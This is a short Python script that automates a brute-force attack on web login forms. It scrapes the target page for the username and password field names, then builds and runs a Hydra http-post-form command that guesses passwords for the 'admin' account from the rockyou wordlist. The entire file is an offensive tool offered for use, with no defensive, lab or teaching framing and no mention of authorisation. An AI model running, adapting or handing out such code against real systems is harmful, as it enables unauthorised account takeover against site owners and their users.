import subprocess, os, requests
from bs4 import BeautifulSoup

def find_form_parameters(url):
    try:
        r = requests.get(url, timeout=5)
        soup = BeautifulSoup(r.text, 'html.parser')
        form = soup.find('form')
        inputs = form.find_all('input')
        
        user_field = ""
        pass_field = ""
        
        for i in inputs:
            name = i.get('name', '').lower()
            itype = i.get('type', '').lower()
            if 'user' in name or 'email' in name or itype == 'text':
                user_field = i.get('name')
            if 'pass' in name or itype == 'password':
                pass_field = i.get('name')
        
        return user_field, pass_field
    except:
        return "user", "pass" # Default fallback

def start_attack(target):
    wordlist = os.path.expanduser("~/wordlists/rockyou.txt")
    if not os.path.exists(wordlist):
        return "Error: No wordlist found."

    # Hunt for the specific login fields (e.g. log, pwd, user, etc)
    u_field, p_field = find_form_parameters(target)
    print(f"[*] Detected Fields: User={u_field}, Pass={p_field}")
    
    clean_target = target.replace("http://", "").replace("https://", "").split('/')[0]
    path = "/" + "/".join(target.split('/')[3:])
    
    # Advanced Hydra command with dynamic parameters
    hydra_params = f"{path}: {u_field}=^USER^&{p_field}=^PASS^:F=Login failed"
    cmd = f"hydra -l admin -P {wordlist} {clean_target} http-post-form \"{hydra_params}\""
    
    print(f"[*] Command: {cmd}")
    result = subprocess.getoutput(cmd)
    return result
